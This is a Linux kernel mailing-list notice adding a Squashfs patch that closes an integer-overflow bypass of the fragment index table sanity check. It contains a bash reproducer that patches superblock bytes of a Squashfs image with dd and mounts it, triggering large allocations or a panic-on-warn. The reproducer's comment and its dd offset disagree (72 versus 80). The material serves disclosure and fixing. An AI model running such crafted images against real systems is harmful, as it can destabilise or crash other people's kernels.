Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795407246;
	b=LX0HXQh2GSBvIsKW6rl/oS5t50Rq2yZopDTeluobfCyg9KB8wM6DLLEcQLbxai/RDxLh
	 H5f6b1G3LciAY8w93aKGYajIYERPcqgNDn0feHwxXDLKRXH+6DtRUkTz8Fdh//FQK73ch
	 /5Ytk+JK+5acrFFM0+V64fQHIvE2rzUqbGzIRsJPIIGv1CAfubdd1lKpTxueMoRvWZHib
	 bUtBe9Ak86roDTYWrBPmpPn0ScPyKJZ+CEgnkqhXmHFoSwu+BGx2sfQzZMI5FbIFbgpt1
	 UvJFr2K6fs20i3EFhxoYOo9WlzTLQJHypVO1xrMkzBssL5CoU+lDDN5CyMsMr16sYUA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795407246;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=98jF6SkHHhggRWH/ZiAShRZmKB2FMT+dX71pjHH4uB0=;
	b=gfpjCfIMyZYuRnf9EYPodKe1bwpVe2OMH5M/7O1Lzh0B2SeMV/89hpP5aldyHU9/fhST
	 OfEzmbZ7+9GD6NBC1HEzO/eAdN1fPvaLCc09djnaWybRMcUPcwd5pR7K3aoH42fLRbcl+
	 5E3yQz6yLnnc9MFgT1ajBCyiruap4CzocK5ZsNua3H+XK+Gw+DOBZ+FS2KuBZXZbJwWw+
	 fiwFlTEuHsV9V0zgO6KBcZZ2tDU4rmjOOP668gcmDl5TEAF0p7kYg68u80ysBwz5Kf5G7
	 FTxS74/y5P4CjYu/i9GECEN2QjoLR5bwVhbaAtOUoaD1wS+/lrf71A+ZcSNkEPq4tuA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=YHIiz75x;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DFD76606A31A
	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:14:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=YHIiz75x
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 886931F000D1;
	Mon, 23 Nov 2026 04:14:05 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795407245;
	bh=98jF6SkHHhggRWH/ZiAShRZmKB2FMT+dX71pjHH4uB0=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=YHIiz75xcq1bFhHhXCdJYvYSXkYVvIrAF4TNXqQbojobX05vMKc+tvABx5hPijn0C
	 ktq+rHqkYV+M8PVqjhxeeGv+7K3Fwd41FervWpdGexQrLm1lFncc9PUhXskNbm5WYf
	 vjrCvUeQefXlEuQ/KLUdn+CUmn3gBaXeKF82UaWQ=
Date: Sun, 22 Nov 2026 20:14:05 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261123034304.261742-11-phillip@squashfs.org.uk>
References: <20261123034304.261742-11-phillip@squashfs.org.uk>
Subject: + squashfs-fix-fragment-index-table-length-too-large-exploit.patch added to mm-nonmm-unstable branch
Message-Id: <20261123041405.886931F000D1@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: Squashfs: fix fragment index table length too large exploit
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     squashfs-fix-fragment-index-table-length-too-large-exploit.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-fix-fragment-index-table-length-too-large-exploit.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: fix fragment index table length too large exploit
Date: Mon, 23 Nov 2026 03:42:51 +0000

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Link: https://patch.msgid.link/20261123034304.261742-11-phillip@squashfs.org.uk
Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>

 fs/squashfs/fragment.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

--- a/fs/squashfs/fragment.c~squashfs-fix-fragment-index-table-length-too-large-exploit
+++ a/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_tab
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-convert-squashfs_compressed_-to-inline-functions.patch
squashfs-convert-squashfs_inode_-and-squashfs_mkinode-to-inline-functions.patch
squashfs-convert-squashfs_fragment_-to-inline-functions.patch
squashfs-convert-squashfs_lookup_-to-inline-functions.patch
squashfs-convert-squashfs_id_-to-inline-functions.patch
squashfs-convert-squashfs_xattr_-to-inline-functions.patch
squashfs-fix-offset-in-squashfs_read_inode-trace-statements.patch
squashfs-dont-compute-start-or-alloc-memory-on-empty-directory-or-index.patch
squashfs-fix-fragment-bytes-overflow-on-32-bit-architectures.patch
squashfs-fix-fragment-index-table-length-too-large-exploit.patch
squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

